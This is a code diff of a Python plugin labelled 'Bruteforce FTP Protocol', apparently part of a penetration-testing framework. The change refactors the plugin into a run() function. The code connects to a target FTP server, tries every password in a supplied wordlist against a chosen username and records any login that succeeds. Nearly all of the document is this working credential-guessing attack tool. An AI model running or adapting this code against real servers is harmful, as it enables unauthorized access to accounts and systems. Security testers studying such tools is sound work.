@@ -1,25 +1,34 @@
 Description = 'Bruteforce FTP Protocol.'
 
 from plugin_support import *
-from ftplib import FTP
 
-try:
-	df = "admin"
-	users = raw_input("[.] Enter user [" + df + "]: ") or df
-	passlist = raw_input("[.] Enter passlist directory: ")
-	ftp = FTP()
-	ftp.connect(ask.target,int(ask.LPORT)) 
+init = {
+    'target':ask.target,
+    'RPORT':ask.RPORT,
+    'USER':ask.USER,
+    'PASSLIST':ask.PASSLIST
+}
 
-	with open(passlist,'r') as passwords:
-		for password in passwords:
-			password=password.replace("\n","")
-			try:
-				ftp.login(users,password)
-				if True:
-					success("Successfully with ["+users+"]["+password+"]\n")
-					Space()
-					UTIL.sRegister(init,password)
-			except:
-				fail(" | Checking '"+password+"'")
-except KeyboardInterrupt:
-	exit()
+def run():
+    global init
+    from ftplib import FTP
+
+    try:
+	    users = init['USER']
+	    passlist = init['PASSLIST']
+	    ftp = FTP()
+	    ftp.connect(init['target'],int(init['RPORT'])) 
+
+	    with open(passlist,'r') as passwords:
+		    for password in passwords:
+			    password=password.replace("\n","")
+			    try:
+				    ftp.login(users,password)
+				    if True:
+					    success("Successfully with ["+users+"]["+password+"]\n")
+					    Space()
+					    UTIL.sRegister(init,password)
+			    except:
+				    fail(" | Checking '"+password+"'")
+    except KeyboardInterrupt:
+	    exit()
